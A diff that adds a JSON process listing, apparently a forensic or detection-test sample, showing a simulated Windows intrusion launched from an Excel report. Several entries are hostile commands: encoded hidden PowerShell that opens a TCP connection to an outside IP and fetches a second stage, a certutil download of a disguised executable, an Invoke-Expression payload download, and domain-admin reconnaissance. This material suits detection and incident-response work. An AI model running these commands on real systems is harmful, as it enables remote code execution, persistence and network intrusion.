@@ -1,0 +1,14 @@
+[
+  {"PID": "5244", "Process": "powershell.exe", "CommandLine": "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADMANAAuADIAMQA4AC4ANAA1ACIALAA0ADQAMwApAA=="},
+  {"PID": "5512", "Process": "certutil.exe",   "CommandLine": "certutil.exe -urlcache -split -f http://185.234.218.45/update.bin C:\\Windows\\Temp\\svc32.exe"},
+  {"PID": "5108", "Process": "cmd.exe",         "CommandLine": "cmd.exe /c powershell -ExecutionPolicy bypass -WindowStyle hidden -NonInteractive -c \"Invoke-Expression((New-Object Net.WebClient).DownloadString('http://185.234.218.45/payload.ps1'))\""},
+  {"PID": "9100", "Process": "powershell.exe",  "CommandLine": "powershell.exe -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOAA1AC4AMgAzADQALgAyADEAOAAuADQANQAvAHMAdABhAGcAZQAyAC4AcABzADEAIgApACkA"},
+  {"PID": "6812", "Process": "svchost.exe",     "CommandLine": "C:\\Windows\\Temp\\svc32.exe -k netsvcs"},
+  {"PID": "7040", "Process": "whoami.exe",       "CommandLine": "whoami /all"},
+  {"PID": "7204", "Process": "net.exe",          "CommandLine": "net group \"Domain Admins\" /domain"},
+  {"PID": "7388", "Process": "nltest.exe",       "CommandLine": "nltest /dclist:FINTECH-CORP.LOCAL"},
+  {"PID": "4832", "Process": "EXCEL.EXE",        "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" /dde \"C:\\Users\\jsmith\\Downloads\\Q4_Financial_Report.xlsx\""},
+  {"PID": "3420", "Process": "explorer.exe",     "CommandLine": "C:\\Windows\\Explorer.EXE"},
+  {"PID": "788",  "Process": "svchost.exe",      "CommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"},
+  {"PID": "664",  "Process": "lsass.exe",        "CommandLine": "C:\\Windows\\system32\\lsass.exe"}
+]
